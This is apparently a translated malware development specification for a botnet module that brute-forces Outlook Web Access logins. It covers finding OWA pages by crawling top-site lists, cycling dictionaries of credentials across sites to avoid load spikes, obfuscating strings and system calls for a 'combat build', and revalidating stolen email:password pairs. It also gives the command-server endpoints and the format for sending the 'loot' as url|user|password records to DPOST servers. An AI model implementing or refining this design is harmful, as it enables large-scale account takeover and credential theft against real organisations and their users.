column1: Sentence
TASK FOR DEVELOPMENT OF OUTLOOK WEB ACCESS (OWA) PASSWORD MINING MODULE
The purpose of the module is distributed password recovery for OWA.
* Marking (postpone) means that this functionality does not need to be implemented yet.
WORKING PRINCIPLE
The module receives the following information from the server in the form of configs:
- list of login:password for selection
- list of settings
- list of DPOST servers
The module consists of two parts:
- crawler
- scanner
The crawler generates the url to be checked.
The scanner checks them.
The principle of the crawler: randomly traversing domains from the top 500,000 list like Alexa.
The exact source of data for crawling is not clear yet - Alexa has a paid subscription.
We need to find an alternative.
s3.amazonaws.com/alexa-static/top-1m.csv.zip
For example, https://www.quantcast.com/top-sites/US/3
(set aside)
Backup: work on a hard-coded list of sites retrieved from the server.
Next, the module:
1. takes the next site from the output of the crawler
2. checks for the presence of the path /owa
3. checks for the mail.domain.com/owa path
4. checks for the webmail.domain.com/owa path.
if owa is not found on any path, goto 1
7. takes the next login:password pair from the dictionary
8. sends an HTTP request for the login to owa.
if login fails, goto 7
if successful, adds the found combination to the list of found logins as url|login|password
REALIZATION
The name of the project is owa.
When implementing, the following should be done (the description of the algorithm is greatly simplified):
1. brute-force should be performed in multiple threads.
It is up to the developer to choose a specific multithreading scheme.
The following variant can be proposed:
* crawler works in one thread, all found urls are put into a queue (protected by mutex).
Scanning threads (the number is limited) take several urls for scanning from the queue (this is a variation of thread pooling).
Each scan thread runs on H randomly selected sites from the list.
If the login fails, the next site is taken, and the current one is put at the end of the queue.
That is, the brute force is performed cyclically on H sites, so as not to give a peak load on one and the same site.
If a password is found for a site, it is removed from the queue.
- the number of threads is set by compilation constant and configuration from the config
- The module minimizes the number of connect() calls to open TCP connections.
Between iterations, the connection should be kept
open until the server closes it.
In this case, the connection should be re-opened.
If an attempt to reopen the connection fails twice in a row, attempts to connect to the given site are stopped for half an hour
(the constant is set at compile time).
2. it is necessary to provide a delay in seconds between iterations of selection (also compilation constant and config setting).
3. User-Agent should be configured.
It should be configured as a compilation constant,
and as a module setting.
It should be provided that the site can react to cookies.
For example, refuse to work if it does not receive the cookie,
given on the original GET / HTTP/1.1
The module sends a list of found passwords once every H minutes (set by a compilation constant and configuration from the config),
provided that new passwords have been found since the previous sending.
Logic of sending and protocol are described in the document "TOR of DPOST.txt password robbing"
6. (postpone) if brute force does not yield results, start checking by dictionary.
The URL of dictionaries for downloading is taken from the "list of settings" config.
The module is designed in accordance with the rules of module development (see modules_HOWTO.txt).
The module sends the following events with the owa tag:
- "Version build %DATE% %TIME%" (once at startup)
- "OWA passwords sent to DPOST server" on successful sending of collected passwords
- "OWA passwords send failure: servers unavailable" when there are no DPOST servers available.
- "No OWA passwords in range; trying dictionaries" if the entire list is finished, nothing is found, and trying dictionaries is started.
- "No OWA passwords; give up" if dictionaries are searched and nothing is found.
In this case, the module should issue the WantRelease event (see "module_HOWTO") to unload from memory
In this module you can use C++ STL (std::string, containers) in a limited way.
It is forbidden to use std::mutex and synchronization primitives - for this purpose you can use only
WinAPI synchronization primitives (CRITICAL_SECTION, etc.).
Obfuscate strings with Andrivet library (attached, see _
STR() macro).
Obfuscate system calls with GetApi.h library.
Be careful, obfuscation of system calls may cause crashes.
The module must have two versions - x32- and x64-bit.
In the combat build, lines should be obfuscated to the maximum and all debugging output should be disabled.
The module must have a debug version.
Debug output should be output to c:/temp/owa.log (the path to the log is configured in the macro).
The project must have a config.h settings file (the name is not important, it's the essence that matters - all global settings - paths, macros, conditional compilation switches, etc.).
The module should work on all modern versions of Windows.
The minimum supported Windows version is Windows XP (if it is impossible - Windows Vista).
The project must be designed for building in Microsoft Visual Studio not lower than 2015.
The Visual Studio project must be configured as follows:
* For ALL build profiles:
- Output directory: $(SolutionDir)Bin\$(PlatformTarget)\$(Configuration)\.
- Intermediate directory: $(SolutionDir)\obj\$(Platform)\$(Configuration)\$(ProjectName)\.
- Multiprocessor Compilation:
Yes
* Release Profile:
- Debugging Information Format (C/C++ code creation):
no
- Create debugging information (linker/debugging):
no
CONFIGS.
The name of the config is the Ctl argument of the Control function, the contents of the config is the CtlArg argument (see modules_HOWTO.txt)
All text in configs is case-sensitive; tags and service values must be lowercase.
Configs must be in any single-byte encoding (preferably ASCII).
XML comments are not allowed.
* settings
A config is a simple xml in the following format:
<owa>
<delay>delay between matching iterations, in milliseconds</delay>
<threads>number of matching threads</threads>
<nurl>number of urls checked by one thread (cyclically)</nurl>
<ua>user agent</ua>
(defer)<dict1>URL of additional dictionary 1</dict1>
(postpone)<dict2>URL of additional dictionary 2</dict2>
(postpone)<dict3>URL of additional dictionary 3</dict3>
<dictN>URL of additional dictionary N</dictN>
</owa>
All parameters from this config are optional.
If no parameter is specified, the compile time constant is used.
* dpost
The config is a simple xml in the following format:
<dpost>
<handler>http://11.22.33.44:8082</handler>
<handler>127.0.0.1:8083</handler>
</dpost>
The http/https prefix to the handler is optional.
If it is specified, the specified protocol should be used.
If it is not specified:
- if the port value is even, the operation is without encryption (HTTP), if the port is odd, the operation is over SSL/TLS (HTTPS).
The configuration contains a list of servers to which the results should be sent via DPOST protocol.
Send format: plain text; line separator - \r\n, field separator - '|' (vertical dash).
Record format:
url|user|password\r\n
* pw
List of "username" "password" pairs.
The text is gzip packed.
string format username|password\r\n
(set aside) *
sites
The configuration is a simple text list, line separator - characters \r\n
Each line - one domain name.
It may or may not contain the protocol prefix http(s)://.
In this case, you should try both prefixes when brute-forcing.
(defer) *
dict
The dict is a simple text list, the line separator is \r\n characters.
Each line is a login/password pair.
The field delimiter is the '|' character (vertical dash).
(ignore
The config is a simple text list, line delimiter - \r\n characters
Each line is a URL.
This will include addresses of top sites like gmail.
Addresses from this list should be ignored in the search.
This refers to the address of the current domain being scanned,
not the domain portion of the current email address being crawled.
SECOND VERSION
The main changes of the second version:
- new verification mode
- command server operation
TEST MODE
In this mode, the module does not search for new passwords, but checks the existing database for relevance.
Accordingly, in this mode:
- the scanner does not work according to the Alexa list, but takes the next email from the email:password dictionary as input
- OWA URL search algorithm is preserved (guessing urls of the webmail.domain.com/owa type)
- we check one specific email:password pair per domain (or rather, per guessed OWA URL of this domain).
- we add the setting mode=check|brute, where check - check mode, brute - search and bruteforce mode (logic of the first version).
Regarding configs and dictionaries, see below.
COMMAND SERVER AND CONFIGS
Previously, we received all source data in the form of configs from the backend of bots.
This is quite inconvenient for various reasons - backend restrictions on config sizes,
limitations on operator control of the configs, lack of a common network status,
lack of specialized storage for results.
Instead, a command server will be used, from which we ask for configs and input lists,
and to whom we give the loot.
Because of this, all configs from the first version are abolished.
There's a new srv config containing a list of control server addresses,
separated by \r\n or \n, in address:port format.
If the port is even, the operation is HTTP, if odd - HTTPS.
If a protocol prefix is specified (http/https), the prefix takes precedence over the specified port.
The module works with the control server that was reached first, for each request.
The operating mode can be obtained by HTTP-request to the server
GET /<group>/<clientid>/owa/mode HTTP/1.1
The group and clientid values are struct ParentInfo fields
CHAR ParentID[256];
CHAR ParentGroup[64];
(see module_HOWTO)
The module expects a brute or check string in the body of the HTTP response.
Any other value is invalid - in this case the module makes repeated requests every 5 minutes; until it receives a correct one.
every 5 minutes; until a correct response is received, the module does not start its work.
The scanner receives the list of domains to be checked by HTTP-request to the server
Number of scanning threads:
GET /<group>/<clientid>/owa/th HTTP/1.1
The response is a non-negative number.
If atoi(response) == 0, then the default number of threads = std::thread_concurrency() - 1.
GET /<group>/<clientid>/owa/domains HTTP/1.1
Response format:
address1[\r]\n
domain2[\r]\n
(one or many entries)
When the enumeration of the given list is completed, we let the server know about it:
GET /<group>/<clientid>/owa/over HTTP/1.1
The server's response is the same as to the /domains request - a new list of domains to work with.
In case of an unexpected response (empty list, error code, etc.)
the module goes to idle (scanning is stopped).
and makes the same request once every 10 minutes (time is a constant).
The dictionary for enumeration is obtained by HTTP-request to the control server:
GET /<group>/<clientid>/owa/dict HTTP/1.1
In response we get the dictionary either as text/plain or application/gzip (look at the Content-Type response header).
If the packing is gzip, then after unpacking we expect the same dictionary format as for plain text.
Format:
email:password[\r]\n
Sending is done via the DPOST protocol (see "DPOST password rob TOR" for a description of the protocol) with the following request
POST /<group>/<clientid>/owa/81
HTTP/1.1
The collected data is sent in a multipart/form-data container with source and data fields.
The value of the source field is "OWA Passwords"
Data field value: plain text, line separator \r\n.
Record format:
owa|url||<username>|<password>\r\n
(one or many entries)
You can get the frequency of sending dummy data from the control server by HTTP request
GET /<group>/<clientid>/owa/freq HTTP/1.1
In the body of the response we expect a number - this is the number of seconds, not more often than which the data should be sent.
If it is 0 - we send it as soon as a new result is ready.
If it is a positive number - we accumulate records in the buffer and send once in X seconds,
clearing the buffer on successful sending.
When the enumeration of the issued list is completed, we let the server know about it:
GET /<group>/<clientid>/owa/over HTTP/1.1
The server's response is the same as to the /domains request - a new list of domains to work with.
In case of an unexpected response (empty list, error code, etc.)
the module goes to idle (scanning is stopped).
and makes the same request once every 10 minutes (time is a constant).
